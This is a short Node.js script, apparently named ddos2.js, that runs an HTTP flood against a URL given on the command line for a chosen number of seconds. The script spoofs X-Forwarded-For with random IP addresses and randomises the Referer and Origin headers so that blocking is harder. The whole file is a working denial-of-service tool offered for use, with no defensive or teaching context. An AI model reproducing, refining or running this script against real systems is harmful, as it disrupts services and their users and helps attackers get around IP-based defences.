// CREDIT: T.M.K team, KUNLE
const got = require('got');
const randomstring = require("randomstring");

function randomIP() {
  return Array.from({ length: 4 }, () => Math.floor(Math.random() * 256)).join('.');
}

const args = process.argv.slice(2);
if (args.length < 2) {
  console.log("Usage: node ddos2.js <url> <duration_seconds>");
  process.exit(1);
}

const url = args[0];
const duration = parseInt(args[1]) * 1000;
const end = Date.now() + duration;

console.log(`[~] Starting ddos on ${url} for ${duration / 1000} seconds`);

const flood = async () => {
  while (Date.now() < end) {
    try {
      const fakeIP = randomIP();
      const randRef = randomstring.generate(10);
      await got(url, {
        headers: {
          'User-Agent': `Mozilla/5.0 (Windows NT 10.0; Win64; x64)`,
          'X-Forwarded-For': fakeIP,
          'Referer': `http://example.com/${randRef}`,
          'Origin': `http://${randRef}.test`
        },
        timeout: 3000,
        retry: { limit: 0 }
      });
      console.log(`Sent request from ${fakeIP}`);
    } catch (err) {
      console.log('Request blocked or errored');
    }
  }
  console.log(`[✓] Ddos finished`);
};

flood();